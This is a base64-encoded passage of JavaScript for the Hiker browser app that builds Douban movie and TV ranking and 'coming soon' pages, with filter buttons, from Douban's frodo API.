KyAnL3JhbmtfbGlzdCcpO1xcXFxyXFxcXG4gICAgICAgIHRlbXAuY2F0ZWdvcnlfbGlzdHMgPSB0Lmdyb3Vwc1syXS50YWJzO1xcXFxyXFxcXG4gICAgICAgIHB1dE15VmFyKCdyYW5rTGlzdCcsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICBpZiAodGVtcC5saXN0ID09ICd5ZWFyX3JhbmtzJykge1xcXFxyXFxcXG4gICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImJsYW5rX2Jsb2NrXFxcXFxcXCJcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgICAgIGlmICghdGVtcC55ZWFyKSB0ZW1wLnllYXIgPSB0ZW1wLnllYXJfbGlzdHNbMF0ua2V5O1xcXFxyXFxcXG4gICAgICAgIGZvciAobGV0IHQgb2YgdGVtcC55ZWFyX2xpc3RzKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogdGVtcC55ZWFyID09IHQua2V5ID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyB0LnRpdGxlICsgJyA8L2ZvbnQ+PC9iPicgOiB0LnRpdGxlLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ3JhbmtMaXN0JykpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHRlbXAueWVhciA9IGU7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJyYW5rTGlzdFxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9LCB0LmtleSlcXFxcclxcXFxuICAgICAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICB9IGVsc2UgaWYgKHRlbXAubGlzdCA9PSAnY2F0ZWdvcnlfcmFua3MnKSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgaWYgKCF0ZW1wLmNhdGVnb3J5KSB0ZW1wLmNhdGVnb3J5ID0gdGVtcC5jYXRlZ29yeV9saXN0c1swXS5rZXk7XFxcXHJcXFxcbiAgICAgICAgZm9yIChsZXQgdCBvZiB0ZW1wLmNhdGVnb3J5X2xpc3RzKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogdGVtcC5jYXRlZ29yeSA9PSB0LmtleSA/ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz4nICsgdC50aXRsZSArICcgPC9mb250PjwvYj4nIDogdC50aXRsZSxcXFxcclxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdyYW5rTGlzdCcpKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB0ZW1wLmNhdGVnb3J5ID0gZTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcInJhbmtMaXN0XFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcclxcXFxuICAgICAgICAgICAgICAgIH0sIHQua2V5KVxcXFxyXFxcXG4gICAgICAgICAgICB9KVxcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgbCA9IFtdO1xcXFxyXFxcXG4gICAgaWYgKHRlbXAubGlzdCA9PSAncmFua19saXN0JyAmJiBNWV9QQUdFID09IDEpIHtcXFxcclxcXFxuICAgICAgICBsZXQgcyA9IGdldERvdWJhblJlcyhcXFxcXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcXFxcXCIgKyB0ZW1wLnR5cGUgKyAnLycgKyB0ZW1wLmxpc3QgKyAocGFnZSA/IFxcXFxcXFwiP3N0YXJ0PVxcXFxcXFwiICsgKHBhZ2UgLSAxKSAqIGNvdW50ICsgXFxcXFxcXCImY291bnQ9XFxcXFxcXCIgKyBjb3VudCA6IFxcXFxcXFwiP3N0YXJ0PTAmY291bnQ9MTBcXFxcXFxcIikpO1xcXFxyXFxcXG4gICAgICAgIGwgPSBzLmdyb3Vwc1swXS5zZWxlY3RlZF9jb2xsZWN0aW9ucztcXFxcclxcXFxuICAgIH0gZWxzZSBpZiAodGVtcC5saXN0ID09ICd5ZWFyX3JhbmtzJyAmJiBNWV9QQUdFID09IDEpIHtcXFxcclxcXFxuICAgICAgICBsZXQgcyA9IGdldERvdWJhblJlcyhcXFxcXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcXFxcXCIgKyB0ZW1wLnR5cGUgKyAnLycgKyB0ZW1wLmxpc3QgKyAnP3llYXI9JyArIHRlbXAueWVhciArIChwYWdlID8gXFxcXFxcXCImc3RhcnQ9XFxcXFxcXCIgKyAocGFnZSAtIDEpICogY291bnQgKyBcXFxcXFxcIiZjb3VudD1cXFxcXFxcIiArIGNvdW50IDogXFxcXFxcXCImc3RhcnQ9MCZjb3VudD0xMFxcXFxcXFwiKSk7XFxcXHJcXFxcbiAgICAgICAgbCA9IHMuZ3JvdXBzWzBdLnNlbGVjdGVkX2NvbGxlY3Rpb25zO1xcXFxyXFxcXG4gICAgfSBlbHNlIGlmICh0ZW1wLmxpc3QgPT0gJ2NhdGVnb3J5X3JhbmtzJykge1xcXFxyXFxcXG4gICAgICAgIGxldCBzID0gZ2V0RG91YmFuUmVzKFxcXFxcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFxcXFxcIiArIHRlbXAudHlwZSArICcvJyArIHRlbXAubGlzdCArICc/Y2F0ZWdvcnk9JyArIHRlbXAuY2F0ZWdvcnkgKyAocGFnZSA/IFxcXFxcXFwiJnN0YXJ0PVxcXFxcXFwiICsgKHBhZ2UgLSAxKSAqIGNvdW50ICsgXFxcXFxcXCImY291bnQ9XFxcXFxcXCIgKyBjb3VudCA6IFxcXFxcXFwiJnN0YXJ0PTAmY291bnQ9MTBcXFxcXFxcIikpO1xcXFxyXFxcXG4gICAgICAgIGwgPSBzLnNlbGVjdGVkX2NvbGxlY3Rpb25zO1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBpID0gW107XFxcXHJcXFxcbiAgICBpZiAodGVtcC5saXN0ID09ICdjYXRlZ29yeV9yYW5rcycpIHtcXFxcclxcXFxuICAgICAgICBpID0gbC5tYXAoKGUgPT4gKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgZS50aXRsZS5ib2xkKCksXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eS8kcGFnZXtmeXBhZ2V9I25vSGlzdG9yeSMnKS5ydWxlKCh0eXBlLCBpZCkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgaWYgKHR5cGUgPT09IFxcXFxcXFwicGxheWxpc3RcXFxcXFxcIikge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGRvdUxpc3QoaWQsIE1ZX1BBR0UsIDUwKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgc3ViamVjdENvbGxlY3Rpb25MaXN0KE1ZX1BBR0UsIDUwLCBpZCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgIH0sIGUudHlwZSwgZS5pZCksXFxcXHJcXFxcbiAgICAgICAgICAgIGltZzogZS5jb3Zlcl91cmwgKyBcXFxcXFxcIkBSZWZlcmVyPVxcXFxcXFwiICsgZS5jb3Zlcl91cmwsXFxcXHJcXFxcbiAgICAgICAgICAgIGRlc2M6IFxcXFxcXFwi5YWxXFxcXFxcXCIgKyBlLnRvdGFsICsgXFxcXFxcXCLpg6hcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pKSk7XFxcXHJcXFxcbiAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgIGkgPSBsLm1hcCgoZSA9PiAoe1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogJycgLyon4oCc4oCc4oCd4oCdJyArIGUubWVkaXVtX25hbWUgKyAnXFxcXFxcXFxuJyArIGdldFN0cm9uZ1RleHQoZS50aXRsZSkqLyAsXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnY2FyZF9waWNfMicsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eS8kcGFnZXtmeXBhZ2V9I25vSGlzdG9yeSMnKS5ydWxlKCh0eXBlLCBpZCwgc3RpdGxlKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBzZXRQYWdlVGl0bGUoc3RpdGxlKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFxcXFxcInBsYXlsaXN0XFxcXFxcXCIpIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBkb3VMaXN0KGlkLCBNWV9QQUdFLCA1MCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHN1YmplY3RDb2xsZWN0aW9uTGlzdChNWV9QQUdFLCA1MCwgaWQpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICB9LCBlLnR5cGUsIGUuaWQsIGUudGl0bGUpLFxcXFxyXFxcXG4gICAgICAgICAgICBpbWc6IGUuY292ZXJfdXJsICsgXFxcXFxcXCJAUmVmZXJlcj1cXFxcXFxcIiArIGUuY292ZXJfdXJsLFxcXFxyXFxcXG4gICAgICAgICAgICBkZXNjOiBcXFxcXFxcIjBcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pKSk7XFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgcmV0dXJuIHBhZ2UgPiAxID8gaSA6IGEuY29uY2F0KGkpO1xcXFxyXFxcXG59XFxcXHJcXFxcblxcXFxyXFxcXG4vL+WwhuS4iuaYoFxcXFxyXFxcXG5mdW5jdGlvbiBjb21pbmdMaXN0KHBhZ2UsIGNvdW50KSB7XFxcXHJcXFxcbiAgICBpZiAoIWdldE15VmFyKCdjb21pbmcnKSkgcHV0TXlWYXIoJ2NvbWluZycsICd7XFxcXFxcXCJ0eXBlXFxcXFxcXCI6XFxcXFxcXCJtb3ZpZVxcXFxcXFwiLFxcXFxcXFwicmFua1xcXFxcXFwiOlxcXFxcXFwiJnNvcnRieT1ob3RcXFxcXFxcIixcXFxcXFxcImxvY2FsXFxcXFxcXCI6XFxcXFxcXCJkb21lc3RpY1xcXFxcXFwiLFxcXFxcXFwiYXJlYVxcXFxcXFwiOlxcXFxcXFwiXFxcXFxcXCIsXFxcXFxcXCJmaWx0ZXJcXFxcXFxcIjpcXFxcXFxcIlxcXFxcXFwifScpO1xcXFxyXFxcXG4gICAgbGV0IGEgPSBbXTtcXFxcclxcXFxuICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignY29taW5nJykpO1xcXFxyXFxcXG4gICAgbGV0IGNvbG9yID0gZ2V0Q29uZmlnKCdjaG9vc2VDb2xvcicpO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBpdGVtcyA9IHtcXFxcclxcXFxuICAgICAgICDnlLXlvbE6ICdtb3ZpZScsXFxcXHJcXFxcbiAgICAgICAg55S16KeG5YmnOiAndHYnXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbiAgICBmb3IgKGxldCBpIGluIGl0ZW1zKSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAudHlwZSA9PT0gaXRlbXNbaV0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIGkgKyAnIDwvZm9udD48L2I+JyA6IGksXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignY29taW5nJykpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGVtcC50eXBlID0gZTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiY29taW5nXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgIH0sIGl0ZW1zW2ldKVxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbiAgICBsZXQgcmFuayA9IHtcXFxcclxcXFxuICAgICAgICDng63luqY6ICcmc29ydGJ5PWhvdCcsXFxcXHJcXFxcbiAgICAgICAg5pe26Ze0OiAnJ1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJibGFua19ibG9ja1xcXFxcXFwiXFxcXHJcXFxcbiAgICB9KVxcXFxyXFxcXG4gICAgZm9yIChsZXQgaSBpbiByYW5rKSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAucmFuayA9PT0gcmFua1tpXSA/ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz4nICsgaSArICcgPC9mb250PjwvYj4nIDogaSxcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdjb21pbmcnKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0ZW1wLnJhbmsgPSBlO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJjb21pbmdcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcclxcXFxuICAgICAgICAgICAgfSwgcmFua1tpXSlcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgbGV0IGxvY2FsID0ge1xcXFxyXFxcXG4gICAgICAgIOWbveWGhTogJ2RvbWVzdGljJyxcXFxcclxcXFxuICAgICAgICDlhajnkIM6ICdpbnRlcm5hdGlvbmFsJ1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgaWYgKHRlbXAudHlwZSA9PSAnbW92aWUnKSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgZm9yIChsZXQgaSBpbiBsb2NhbCkge1xcXFxyXFxcXG4gICAgICAgICAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRlbXAubG9jYWwgPT09IGxvY2FsW2ldID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBpICsgJyA8L2ZvbnQ+PC9iPicgOiBpLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NvbWluZycpKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB0ZW1wLmxvY2FsID0gZTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImNvbWluZ1xcXFxcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9LCBsb2NhbFtpXSlcXFxcclxcXFxuICAgICAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbiAgICBsZXQgYXJlYSA9IHtcXFxcclxcXFxuICAgICAgICDlhajpg6g6ICcnLFxcXFxyXFxcXG4gICAgICAgIOe+juWbvTogJyZhcmVhX2ZpbHRlcj1hbWVyaWNhbicsXFxcXHJcXFxcbiAgICAgICAg5qyn5rSyOiAnJmFyZWFfZmlsdGVyPWV1cm9wZScsXFxcXHJcXFxcbiAgICAgICAg5pel5pysOiAnJmFyZWFfZmlsdGVyPWphcGFuZXNlJyxcXFxcclxcXFxuICAgICAgICDpn6nlm706ICcmYXJlYV9maWx0ZXI9a29yZWFuJ1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgaWYgKHRlbXAudHlwZSA9PSAnbW92aWUnICYmIHRlbXAubG9jYWwgPT0gJ2ludGVybmF0aW9uYWwnKSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgZm9yIChsZXQgaSBpbiBhcmVhKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogdGVtcC5hcmVhID09PSBhcmVhW2ldID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBpICsgJyA8L2ZvbnQ+PC9iPicgOiBpLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NvbWluZycpKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB0ZW1wLmFyZWEgPSBlO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiY29taW5nXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcclxcXFxuICAgICAgICAgICAgICAgIH0sIGFyZWFbaV0pXFxcXHJcXFxcbiAgICAgICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgbGV0IGZpbHRlciA9IHtcXFxcclxcXFxuICAgICAgICDlhajpg6g6ICcnLFxcXFxyXFxcXG4gICAgICAgIOWbveS6p+WJpzogJyZ0eXBlX2ZpbHRlcj10dl9kb21lc3RpYycsXFxcXHJcXFxcbiAgICAgICAg5qyn576O5YmnOiAnJnR5cGVfZmlsdGVyPXR2X2FtZXJpY2FuJyxcXFxcclxcXFxuICAgICAgICDml6Xliac6ICcmdHlwZV9maWx0ZXI9dHZfamFwYW5lc2UnLFxcXFxyXFxcXG4gICAgICAgIOmfqeWJpzogJyZ0eXBlX2ZpbHRlcj10dl9rb3JlYW4nLFxcXFxyXFxcXG4gICAgICAgIOWKqOeUuzogJyZ0eXBlX2ZpbHRlcj10dl9hbmltYXRpb24nLFxcXFxyXFxcXG4gICAgICAgIOWbveWGhee7vOiJujogJyZ0eXBlX2ZpbHRlcj1zaG93X2RvbWVzdGljJyxcXFxcclxcXFxuICAgICAgICDlm73lpJbnu7zoibo6ICcmdHlwZV9maWx0ZXI9c2hvd19mb3JlaWduJ1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgaWYgKHRlbXAudHlwZSA9PSAndHYnKSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgZm9yIChsZXQgaSBpbiBmaWx0ZXIpIHtcXFxcclxcXFxuICAgICAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiB0ZW1wLmZpbHRlciA9PT0gZmlsdGVyW2ldID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBpICsgJyA8L2ZvbnQ+PC9iPicgOiBpLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NvbWluZycpKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB0ZW1wLmZpbHRlciA9IGU7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJjb21pbmdcXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSwgZmlsdGVyW2ldKVxcXFxyXFxcXG4gICAgICAgICAgICB9KVxcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgcyA9IGdldERvdWJhblJlcyhcXFxcXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcXFxcXCIgKyB0ZW1wLnR5cGUgKyBcXFxcXFxcIi9jb21pbmdfc29vblxcXFxcXFwiICsgXFxcXFxcXCI/YXJlYT1cXFxcXFxcIiArIHRlbXAubG9jYWwgKyB0ZW1wLnJhbmsgKyB0ZW1wLmFyZWEgKyB0ZW1wLmZpbHRlciArIChwYWdlID8gXFxcXFxcXCImc3RhcnQ9XFxcXFxcXCIgKyAocGFnZSAtIDEpICogY291bnQgKyBcXFxcXFxcIiZjb3VudD1cXFxcXFxcIiArIGNvdW50IDogXFxcXFxcXCImc3RhcnQ9MCZjb3VudD0xMFxcXFxcXFwiKSk7XFxcXHJcXFxcbiAgICBsZXQgbCA9IHMuc3ViamVjdHM7XFxcXHJcXFxcbiAgICBsZXQgZGV0YWlsc1ZpZXdDb25maWdzID0gZ2V0Q29uZmlnKCdkZXRhaWxzVmlld0NvbmZpZ3MnKTtcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgaSA9IGwubWFwKChlID0+IHtcXFxcclxcXFxuICAgICAgICBsZXQgdHlwZSA9IGUudHlwZSxcXFxcclxcXFxuICAgICAgICAgICAgaWQgPSBlLmlkLFxcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZSA9IGUudGl0bGU7XFxcXHJcXFxcbiAgICAgICAgbGV0IHVzZUNvbmZpZyA9IGRldGFpbHNWaWV3Q29uZmlnc1tkZXRhaWxzVmlld0NvbmZpZ3MudXNlXS5jb25maWc7XFxcXHJcXFxcbiAgICAgICAgbGV0IHVybFBhcmFtcyA9IHt9O1xcXFxyXFxcXG4gICAgICAgIGlmICh1c2VDb25maWcuc3RhcnRzV2l0aCgneycpKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGV2YWwoJ3VybFBhcmFtcyA9ICcgKyB1c2VDb25maWcpO1xcXFxyXFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgIHVybFBhcmFtcy51cmwgPSAkKFxcXFxcXFwiaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjI2ltbWVyc2l2ZVRoZW1lI1xcXFxcXFwiICsgJz90eXBlPScgKyB0eXBlICsgJyZpZD0nICsgaWQpLnJ1bGUoKHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcXFxcXCJwbGF5bGlzdFxcXFxcXFwiKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgIH0sIHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKTtcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgcmV0dXJuIHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHRpdGxlICsgXFxcXFxcXCLvvIhcXFxcXFxcIiArIGUueWVhciArIFxcXFxcXFwi77yJXFxcXFxcXCIsXFxcXHJ